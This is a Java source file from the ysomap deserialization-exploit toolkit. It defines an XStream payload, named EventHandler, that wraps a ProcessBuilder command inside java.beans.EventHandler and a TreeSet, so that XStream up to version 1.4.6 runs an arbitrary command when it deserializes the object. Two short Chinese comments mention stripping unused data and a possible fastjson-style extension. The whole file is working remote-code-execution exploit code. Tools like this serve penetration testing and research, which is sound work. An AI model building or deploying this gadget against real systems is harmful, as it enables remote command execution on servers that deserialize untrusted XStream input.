package ysomap.core.payload.xstream;

import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.ProcessBuilderBullet;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2020/4/16
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Dependencies({"Gadget For XStream","<=com.thoughtworks.xstream:xstream:1.4.6"})
@Require(bullets = {"ProcessBuilderBullet","JdbcRowSetImplBullet"}, param = false)
public class EventHandler extends Payload<Object> {
    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new ProcessBuilderBullet().set("command",command);
    }

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("xstream");
    }

    @Override
    public Object pack(Object obj) throws Exception {
        String action = bullet.get("action");
        if(action == null){
            action = "start";
        }
        Object entry = java.beans.EventHandler.create(Comparable.class, obj, action);
        Object h = ReflectionHelper.getFieldValue(entry, "h");
        ReflectionHelper.setFieldValue(h, "acc", null);// 清除无用数据
        return PayloadHelper.makeTreeSet("foo", entry);
    }
    // 这里还可以扩展 fastjson 那种利用getters的方式
}
